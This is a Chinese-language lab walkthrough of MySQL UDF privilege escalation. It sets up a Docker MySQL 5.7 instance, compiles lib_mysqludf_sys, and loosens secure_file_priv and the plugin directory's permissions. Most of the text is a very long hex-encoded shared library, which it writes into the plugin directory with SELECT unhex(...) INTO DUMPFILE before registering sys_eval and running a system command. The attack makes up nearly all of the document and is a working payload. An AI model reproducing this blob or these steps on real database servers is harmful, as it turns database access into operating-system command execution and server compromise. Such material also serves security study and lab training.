## 0x00 环境搭建

```
cd docker
docker build -t s1r1u5/mysql:5.7   .
docker run -d --rm -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456  s1r1u5/mysql:5.7

```

前置,mysql下的提权主要受限于两个方面
1. secure_file_priv参数:mysql5.7以后利用secure_file_priv将mysql的文件操作load和into的操作范围限定在了一个特定的目录之下
2. mysql的插件目录只有root权限才能访问，mysql的权限是无法导出文件的插件目录下的,ubuntu和centos都是

以上两个限制条件的存在使得黑客即使拿到了mysql的root账户，也很少的几率能够跳到操作系统环境中


两个命令
```
show variables like "%secure%";
show variables like '%plugin%';
```

## 0x01 安装依赖环境

```
docker ps 
docker exec -it 56532100a269  sh
apt-get update && apt-get install libmysqld-dev gcc git
git clone https://github.com/sqlmapproject/udfhack.git
cd udfhack/linux/lib_mysqludf_sys
gcc -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so

```

查看插件目录
show variables like '%plugin%';
![](luffy1.png)


mysql的文件导出目录被写死了

```
show variables like "%secure%";
```

![](luffy2.png)

而作为演示，我修改了/etc/mysql/mysql.conf.d/mysqld.cnf的文件，在最后添加了secure_file_priv = 这样就可以导出到任意位置了


## 0x03 编译提权


```
cp /udfhack/linux/lib_mysqludf_sys/lib_mysqludf_sys.so /tmp
chmod 777 lib_mysqludf_sys.so
select hex(load_file( '/tmp/lib_mysqludf_sys.so' )) into outfile '/tmp/udf.txt';
```
![](luffy3.png)

```

select * from func; #检查是否已经有人导出过了

```

还有一个问题，在ubuntu下插件目录/usr/lib/mysql/plugin/ mysql是没有权限可以写入的，要想写入需要修改权限

```
cd  /usr/lib/mysql/
chmod -R 777 plugin
```

导出文件
```
select unhex('7F454C4602010100000000000000000003003E0001000000200D0000000000004000000000000000202E0000000000000000000040003800070040001D001C000100000005000000000000000000000000000000000000000000000000000000D419000000000000D41900000000000000002000000000000100000006000000001E000000000000001E200000000000001E200000000000A002000000000000A80200000000000000002000000000000200000006000000181E000000000000181E200000000000181E200000000000C001000000000000C00100000000000008000000000000000400000004000000C801000000000000C801000000000000C80100000000000024000000000000002400000000000000040000000000000050E5746404000000881600000000000088160000000000008816000000000000AC00000000000000AC00000000000000040000000000000051E574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052E5746404000000001E000000000000001E200000000000001E200000000000000200000000000000020000000000000100000000000000040000001400000003000000474E5500D8BA167A9E514AC3954122ADCA1C9F9CA96449090000000011000000160000000200000007000000800803499119C4C93DA44003980468831600000018000000190000001B0000001D0000001F00000022000000240000000000000025000000000000002600000027000000290000002B0000002C00000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED871581CC1E2F7DEA868BE12BBE3927C7E8B92CDC2F9BFBA1F7066A9745BB073371974EC4345D5ECC5A62C1CC3138AFF3A9FD4A037AC68AEAC73D1C525681B320B5911FEAB5FBE12000000000000000000000000000000000000000000000000E10000001200000000000000000000000000000000000000120100001200000000000000000000000000000000000000900100001200000000000000000000000000000000000000160000002000000000000000000000000000000000000000260100001200000000000000000000000000000000000000E80000001200000000000000000000000000000000000000E201000012000000000000000000000000000000000000005401000012000000000000000000000000000000000000009E01000012000000000000000000000000000000000000009801000012000000000000000000000000000000000000000100000020000000000000000000000000000000000000001F0100001200000000000000000000000000000000000000FC0000001200000000000000000000000000000000000000880100001200000000000000000000000000000000000000E70100001200000000000000000000000000000000000000820100001200000000000000000000000000000000000000DA01000012000000000000000000000000000000000000005B00000020000000000000000000000000000000000000003200000020000000000000000000000000000000000000004C0000002200000000000000000000000000000000000000D501000012000000000000000000000000000000000000001701000012000C00B411000000000000DA000000000000006901000012000C0032140000000000000B000000000000001000000012000D007C160000000000000000000000000000A700000012000C00B20E0000000000006B000000000000003501000012000900E00B00000000000000000000000000000002000010001800A0202000000000000000000000000000B601000012000C007F150000000000000B000000000000004B01000012000C004E130000000000002F000000000000000C02000010001800A8202000000000000000000000000000CA00000012000C00BE0F0000000000000B00000000000000D900000012000C00C90F00000000000063000000000000005B01000012000C007D13000000000000B5000000000000008A00000012000C00A70E0000000000000B00000000000000BD00000012000C001D0F000000000000A100000000000000F901000010001700A02020000000000000000000000000003B01000012000C0043130000000000000B00000000000000EF00000012000C002C100000000000005C010000000000002D01000012000C008E12000000000000B500000000000000A501000012000C006C1500000000000013000000000000006F00000012000C00200E0000000000008700000000000000C901000012000C008A15000000000000F2000000000000000301000012000C0088110000000000002C000000000000007901000012000C003D140000000000002F01000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F49544D5F64657265676973746572544D436C6F6E655461626C65005F49544D5F7265676973746572544D436C6F6E655461626C65005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F736574006D656D63707900736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365007379735F62696E6576616C5F696E6974007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C00666F726B00737973636F6E66006D6D61700077616974706964006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E313400474C4942435F322E322E350000000200020002000000020002000200020002000200000003000200020002000200020000000000020002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010000000000000001000200EF010000100000000000000094919606000003001102000010000000751A6909000002001C02000000000000001E2000000000000800000000000000F00D000000000000081E2000000000000800000000000000B00D000000000000982020000000000008000000000000009820200000000000D81F20000000000006000000040000000000000000000000E01F200000000000060000000B0000000000000000000000E81F20000000000006000000120000000000000000000000F01F20000000000006000000130000000000000000000000F81F200000000000060000001400000000000000000000001820200000000000070000000100000000000000000000002020200000000000070000000200000000000000000000002820200000000000070000000300000000000000000000003020200000000000070000000500000000000000000000003820200000000000070000000600000000000000000000004020200000000000070000000700000000000000000000004820200000000000070000000800000000000000000000005020200000000000070000000900000000000000000000005820200000000000070000000A00000000000000000000006020200000000000070000000C00000000000000000000006820200000000000070000000D00000000000000000000007020200000000000070000000E00000000000000000000007820200000000000070000000F00000000000000000000008020200000000000070000001000000000000000000000008820200000000000070000001100000000000000000000009020200000000000070000001500000000000000000000004883EC08488B05F51320004885C07402FFD04883C408C3000000000000000000FF3502142000FF25041420000F1F4000FF25021420006800000000E9E0FFFFFFFF25FA1320006801000000E9D0FFFFFFFF25F21320006802000000E9C0FFFFFFFF25EA1320006803000000E9B0FFFFFFFF25E21320006804000000E9A0FFFFFFFF25DA1320006805000000E990FFFFFFFF25D21320006806000000E980FFFFFFFF25CA1320006807000000E970FFFFFFFF25C21320006808000000E960FFFFFFFF25BA1320006809000000E950FFFFFFFF25B2132000680A000000E940FFFFFFFF25AA132000680B000000E930FFFFFFFF25A2132000680C000000E920FFFFFFFF259A132000680D000000E910FFFFFFFF2592132000680E000000E900FFFFFFFF258A132000680F000000E9F0FEFFFFFF25E212200066900000000000000000488D3D79132000488D0579132000554829F84889E54883F80E7615488B05961220004885C074095DFFE0660F1F4400005DC30F1F4000662E0F1F840000000000488D3D39132000488D3532132000554829FE4889E548C1FE034889F048C1E83F4801C648D1FE7418488B05611220004885C0740C5DFFE0660F1F8400000000005DC30F1F4000662E0F1F840000000000803DE912200000752748833D3712200000554889E5740C488B3DCA122000E83DFFFFFFE848FFFFFF5DC605C012200001F3C30F1F4000662E0F1F840000000000488D3D1910200048833F00750BE95EFFFFFF660F1F440000488B05D91120004885C074E9554889E5FFD05DE940FFFFFF554889E548897DE8488975E0488955D8488B45E08B0085C07463488B45D848B94E6F20617267756D48890848BA656E747320616C6C4889500848BE6F776564202875644889701048BF663A206C69625F6D4889781848B97973716C7564665F4889482048BA7379735F696E666F4889502866C740302900C645FF01EB04C645FF000FB645FF5DC3554889E548897DF8905DC3554889E548897DF8488975F0488955E848894DE04C8945D84C894DD0488B45E848BA6C69625F6D79737148891048B96C7564665F7379734889480848BE2076657273696F6E48897010C7401820302E3066C7401C2E34C6401E00488B45E048C7001E000000488B45E85DC3554889E548897DF8488975F0488955E8488B45F08B0083F801752C488B45F0488B40088B0085C0751E488B45F0488B4010488B004885C0740E488B45F8C60001B800000000EB58488B45E848B9457870656374656448890848BA2065786163746C794889500848BE206F6E65207374724889701048BF696E6720747970654889781848B920706172616D65744889482066C740286572C6402A00B8010000005DC3554889E548897DF8905DC3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E814FCFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E834FCFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027448488B45E848B9457870656374656448890848BE2065786163746C794889700848B92074776F2061726748894810C74018756D656E66C7401C7473C6401E00B801000000E9F3000000488B45F0488B40088B0085C07453488B45E848BF457870656374656448893848BE20737472696E67204889700848B97479706520666F724889481048BF206E616D652070614889781848BA72616D657465720048895020B801000000E992000000488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B004801D04883C0024889C7E881FBFFFF4889C2488B45F848895010488B45F8488B40104885C0753A488B45E848BE436F756C64206E6F48893048B97420616C6C6F63614889480848BF7465206D656D6F724889781066C740187900B801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E86FFAFFFF90C9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F8488B45E0488B4018488B00488D5001488B45F84801D0488945F0488B45E0488B4018488B10488B45E0488B4010488B08488B45F84889CE4889C7E889FAFFFF488B45E0488B4018488B10488B45F84801D0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F04889CE4889C7E847FAFFFF488B45E0488B40184883C008488B10488B45F04801D0C60000488B4DF0488B45F8BA010000004889CE4889C7E8B6F9FFFF4898C9C3554889E548897DE8488975E0488955D8C745FC00000000488B45E08B0083F8017539488B45E0488B40088B55FC48C1E2024801D08B0085C07521488B45E0488B40108B55FC48C1E2034801D0488B004885C07407B800000000EB58488B45D848B9457870656374656448890848BE2065786163746C794889700848BF206F6E65207374724889781048B9696E6720747970654889481848BE20706172616D65744889702066C740286572C6402A00B8010000005DC3554889E548897DF8905DC3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E8F7F8FFFF4898C9C3554889E548897DE8488975E0488955D8C745FC00000000488B45E08B0083F8017539488B45E0488B40088B55FC48C1E2024801D08B0085C07521488B45E0488B40108B55FC48C1E2034801D0488B004885C07407B800000000EB58488B45D848B9457870656374656448890848BE2065786163746C794889700848BF206F6E65207374724889781048B9696E6720747970654889481848BE20706172616D65744889702066C740286572C6402A00B8010000005DC3554889E548897DF8905DC3554889E54883EC5048897DD8488975D0488955C848894DC04C8945B84C894DB0BF00040000E849F8FFFF488945F0BF01000000E83BF8FFFF488945C848C745F800000000488B45C8C60000488B45D0488B4010488B00488D35EB0100004889C7E83EF8FFFF488945E8EB55488B45F04889C7E89CF7FFFF488945E0488B55F8488B45E04801C2488B45C84889D64889C7E8EEF7FFFF488945C8488B55C8488B45F8488D0C02488B55E0488B45F04889C64889CFE83BF7FFFF488B45E0480145F8488B55E8488B45F0BE080000004889C7E87EF7FFFF4885C07591488B45E84889C7E85DF7FFFF488B45C80FB60084C0740748837DC8007509488B45B8C60001EB28488B45F8488D50FF488B45C84801D0C60000488B45C84889C7E8F4F6FFFF4889C2488B45C0488910488B45C8C9C3554889E548897DF8488975F0B8000000005DC3554889E548897DF8905DC3554889E54883EC3048897DD8488975D0488B45D0488B4010488B004889C7E8A3F6FFFF488945F8E84AF7FFFF8945F4837DF400790AB801000000E9B1000000837DF4000F8588000000BF1E000000E813F7FFFF4883E801488945E8488B55F8488B45E84801C2488B45E848F7D04821D0488945E8488B45E841B90000000041B800000000B921000000BA070000004889C6BF00000000E83BF6FFFF488945E048837DE0FF7507B801000000EB43488B45D0488B4010488B08488B55F8488B45E04889CE4889C7E8DBF5FFFF488B45E0FFD0837DF4007E148B45F4BA01000000BE0000000089C7E85BF6FFFFB800000000C9C34883EC084883C408C3720000011B033BAC0000001400000078F5FFFFC800000088F6FFFFF000000098F7FFFF080100001FF8FFFF280100002AF8FFFF4801000095F8FFFF6801000036F9FFFF8801000041F9FFFFA8010000A4F9FFFFC801000000FBFFFFE80100002CFBFFFF0802000006FCFFFF28020000BBFCFFFF48020000C6FCFFFF68020000F5FCFFFF88020000AAFDFFFFA8020000B5FDFFFFC8020000E4FEFFFFE8020000F7FEFFFF0803000002FFFFFF28030000000000001400000000000000017A5200017810011B0C070890010000240000001C000000A8F4FFFF10010000000E10460E184A0F0B770880003F1A3B2A33242200000000140000004400000090F5FFFF0800000000000000000000001C0000005C00000088F6FFFF8700000000410E108602430D0602820C070800001C0000007C000000EFF6FFFF0B00000000410E108602430D06460C07080000001C0000009C000000DAF6FFFF6B00000000410E108602430D0602660C070800001C000000BC00000025F7FFFFA100000000410E108602430D06029C0C070800001C000000DC000000A6F7FFFF0B00000000410E108602430D06460C07080000001C000000FC00000091F7FFFF6300000000410E108602430D06025E0C070800001C0000001C010000D4F7FFFF5C01000000410E108602430D060357010C0708001C0000003C01000010F9FFFF2C00000000410E108602430D06670C07080000001C0000005C0100001CF9FFFFDA00000000410E108602430D0602D50C070800001C0000007C010000D6F9FFFFB500000000410E108602430D0602B00C070800001C0000009C0100006BFAFFFF0B00000000410E108602430D06460C07080000001C000000BC01000056FAFFFF2F00000000410E108602430D066A0C07080000001C000000DC01000065FAFFFFB500000000410E108602430D0602B00C070800001C000000FC010000FAFAFFFF0B00000000410E108602430D06460C07080000001C0000001C020000E5FAFFFF2F01000000410E108602430D06032A010C0708001C0000003C020000F4FBFFFF1300000000410E108602430D064E0C07080000001C0000005C020000E7FBFFFF0B00000000410E108602430D06460C07080000001C0000007C020000D2FBFFFFF200000000410E108602430D0602ED0C0708000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F00D000000000000B00D00000000000000000000000000000100000000000000EF010000000000000C00000000000000E00B0000000000000D000000000000007C160000000000001900000000000000001E2000000000001B0000000000000008000000000000001A00000000000000081E2000000000001C000000000000000800000000000000F5FEFF6F00000000F0010000000000000500000000000000E8060000000000000600000000000000B0020000000000000A0000000000000028020000000000000B0000000000000018000000000000000300000000000000002020000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000600A0000000000000700000000000000A0090000000000000800000000000000C00000000000000009000000000000001800000000000000FEFFFF6F000000007009000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000001009000000000000F9FFFF6F000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000181E20000000000000000000000000000000000000000000160C000000000000260C000000000000360C000000000000460C000000000000560C000000000000660C000000000000760C000000000000860C000000000000960C000000000000A60C000000000000B60C000000000000C60C000000000000D60C000000000000E60C000000000000F60C000000000000060D00000000000098202000000000004743433A202844656269616E20362E332E302D31382B6465623975312920362E332E30203230313730353136000000000000000000000000000000000000000000000000000000000000000003000100C80100000000000000000000000000000000000003000200F00100000000000000000000000000000000000003000300B00200000000000000000000000000000000000003000400E80600000000000000000000000000000000000003000500100900000000000000000000000000000000000003000600700900000000000000000000000000000000000003000700A00900000000000000000000000000000000000003000800600A00000000000000000000000000000000000003000900E00B00000000000000000000000000000000000003000A00000C00000000000000000000000000000000000003000B00100D00000000000000000000000000000000000003000C00200D00000000000000000000000000000000000003000D007C1600000000000000000000000000000000000003000E00851600000000000000000000000000000000000003000F00881600000000000000000000000000000000000003001000381700000000000000000000000000000000000003001100001E20000000000000000000000000000000000003001200081E20000000000000000000000000000000000003001300101E20000000000000000000000000000000000003001400181E20000000000000000000000000000000000003001500D81F20000000000000000000000000000000000003001600002020000000000000000000000000000000000003001700982020000000000000000000000000000000000003001800A0202000000000000000000000000000000000000300190000000000000000000000000000000000010000000400F1FF000000000000000000000000000000000C00000001001300101E20000000000000000000000000001900000002000C00200D00000000000000000000000000001B00000002000C00600D00000000000000000000000000002E00000002000C00B00D00000000000000000000000000004400000001001800A02020000000000001000000000000005300000001001200081E20000000000000000000000000007A00000002000C00F00D00000000000000000000000000008600000001001100001E2000000000000000000000000000A50000000400F1FF00000000000000000000000000000000010000000400F1FF00000000000000000000000000000000B800000001001000D0190000000000000000000000000000C600000001001300101E2000000000000000000000000000000000000400F1FF00000000000000000000000000000000D20000000100170098202000000000000000000000000000DF00000001001400181E2000000000000000000000000000E800000000000F0088160000000000000000000000000000FB00000001001700A02020000000000000000000000000000701000001001600002020000000000000000000000000001D01000012000000000000000000000000000000000000003101000012000000000000000000000000000000000000004301000012000000000000000000000000000000000000005801000020000000000000000000000000000000000000007401000012000C00BE0F0000000000000B000000000000008301000012000C004E130000000000002F000000000000008C01000012000C008E12000000000000B5000000000000009A0100001200000000000000000000000000000000000000AE01000010001700A0202000000000000000000000000000B501000012000D007C160000000000000000000000000000BB0100001200000000000000000000000000000000000000CF0100001200000000000000000000000000000000000000E10100001200000000000000000000000000000000000000F501000012000000000000000000000000000000000000000902000012000000000000000000000000000000000000001C02000012000C003D140000000000002F010000000000002502000012000C00C90F00000000000063000000000000002D02000020000000000000000000000000000000000000003C02000012000C00B411000000000000DA000000000000004402000012000000000000000000000000000000000000005702000012000C00B20E0000000000006B000000000000006D02000012000000000000000000000000000000000000008102000012000C00A70E0000000000000B000000000000009E02000012000C002C100000000000005C01000000000000AB02000010001800A8202000000000000000000000000000B002000012000C006C150000000000001300000000000000C102000012000C0032140000000000000B00000000000000D10200001200000000000000000000000000000000000000E602000010001800A0202000000000000000000000000000F202000012000C007F150000000000000B000000000000000503000012000000000000000000000000000000000000001A03000012000000000000000000000000000000000000002D03000012000C0088110000000000002C000000000000003C03000012000C0043130000000000000B000000000000004C03000012000C007D13000000000000B5000000000000005A03000012000000000000000000000000000000000000006F03000020000000000000000000000000000000000000008303000012000C001D0F000000000000A100000000000000900300002000000000000000000000000000000000000000AA03000022000000000000000000000000000000000000009401000012000900E00B0000000000000000000000000000C603000012000C00200E0000000000008700000000000000E103000012000C008A15000000000000F200000000000000ED03000012000000000000000000000000000000000000000063727473747566662E63005F5F4A43525F4C4953545F5F00646572656769737465725F746D5F636C6F6E6573005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E36393732005F5F646F5F676C6F62616C5F64746F72735F6175785F66696E695F61727261795F656E747279006672616D655F64756D6D79005F5F6672616D655F64756D6D795F696E69745F61727261795F656E747279006C69625F6D7973716C7564665F7379732E63005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F64736F5F68616E646C65005F44594E414D4943005F5F474E555F45485F4652414D455F484452005F5F544D435F454E445F5F005F474C4F42414C5F4F46465345545F5441424C455F00676574656E764040474C4942435F322E322E3500667265654040474C4942435F322E322E35007374726E6370794040474C4942435F322E322E35005F49544D5F64657265676973746572544D436C6F6E655461626C65007379735F6765745F6465696E6974007379735F65786563007379735F657865635F696E697400736574656E764040474C4942435F322E322E35005F6564617461005F66696E69007374726C656E4040474C4942435F322E322E35006D6D61704040474C4942435F322E322E350073797374656D4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E350066676574734040474C4942435F322E322E35007379735F6576616C007379735F676574005F5F676D6F6E5F73746172745F5F007379735F736574006D656D6370794040474C4942435F322E3134006C69625F6D7973716C7564665F7379735F696E666F006D616C6C6F634040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E6974005F656E64007379735F62696E6576616C5F696E6974007379735F6576616C5F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F5F6273735F7374617274007379735F62696E6576616C5F6465696E697400776169747069644040474C4942435F322E322E3500706F70656E4040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F657865635F6465696E6974007379735F6576616C5F696E697400737973636F6E664040474C4942435F322E322E35005F4A765F5265676973746572436C6173736573007379735F6765745F696E6974005F49544D5F7265676973746572544D436C6F6E655461626C65005F5F6378615F66696E616C697A654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C00666F726B4040474C4942435F322E322E3500002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E706C742E676F74002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E696E69745F6172726179002E66696E695F6172726179002E6A6372002E64796E616D6963002E676F742E706C74002E64617461002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B000000070000000200000000000000C801000000000000C80100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000F001000000000000F001000000000000C000000000000000030000000000000008000000000000000000000000000000380000000B0000000200000000000000B002000000000000B002000000000000380400000000000004000000010000000800000000000000180000000000000040000000030000000200000000000000E806000000000000E806000000000000280200000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000100900000000000010090000000000005A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F020000000000000070090000000000007009000000000000300000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000A009000000000000A009000000000000C0000000000000000300000000000000080000000000000018000000000000006E000000040000004200000000000000600A000000000000600A000000000000800100000000000003000000160000000800000000000000180000000000000078000000010000000600000000000000E00B000000000000E00B000000000000170000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000000C000000000000000C00000000000010010000000000000000000000000000100000000000000010000000000000007E000000010000000600000000000000100D000000000000100D000000000000080000000000000000000000000000000800000000000000000000000000000087000000010000000600000000000000200D000000000000200D0000000000005C090000000000000000000000000000100000000000000000000000000000008D0000000100000006000000000000007C160000000000007C160000000000000900000000000000000000000000000004000000000000000000000000000000930000000100000002000000000000008516000000000000851600000000000002000000000000000000000000000000010000000000000000000000000000009B00000001000000020000000000000088160000000000008816000000000000AC00000000000000000000000000000004000000000000000000000000000000A9000000010000000200000000000000381700000000000038170000000000009C02000000000000000000000000000008000000000000000000000000000000B30000000E0000000300000000000000001E200000000000001E0000000000000800000000000000000000000000000008000000000000000800000000000000BF0000000F0000000300000000000000081E200000000000081E0000000000000800000000000000000000000000000008000000000000000800000000000000CB000000010000000300000000000000101E200000000000101E0000000000000800000000000000000000000000000008000000000000000000000000000000D0000000060000000300000000000000181E200000000000181E000000000000C00100000000000004000000000000000800000000000000100000000000000082000000010000000300000000000000D81F200000000000D81F0000000000002800000000000000000000000000000008000000000000000800000000000000D9000000010000000300000000000000002020000000000000200000000000009800000000000000000000000000000008000000000000000800000000000000E2000000010000000300000000000000982020000000000098200000000000000800000000000000000000000000000008000000000000000000000000000000E8000000080000000300000000000000A020200000000000A0200000000000000800000000000000000000000000000001000000000000000000000000000000ED0000000100000030000000000000000000000000000000A0200000000000002D00000000000000000000000000000001000000000000000100000000000000010000000200000000000000000000000000000000000000D02000000000000058080000000000001B0000002D000000080000000000000018000000000000000900000003000000000000000000000000000000000000002829000000000000FF03000000000000000000000000000001000000000000000000000000000000110000000300000000000000000000000000000000000000272D000000000000F600000000000000000000000000000001000000000000000000000000000000') into dumpfile '/usr/lib/mysql/plugin/mysqludf.so';
create function sys_eval returns string soname 'mysqludf.so';
select sys_eval('whoami');
drop function sys_eval;
```

![](luffy4.png)




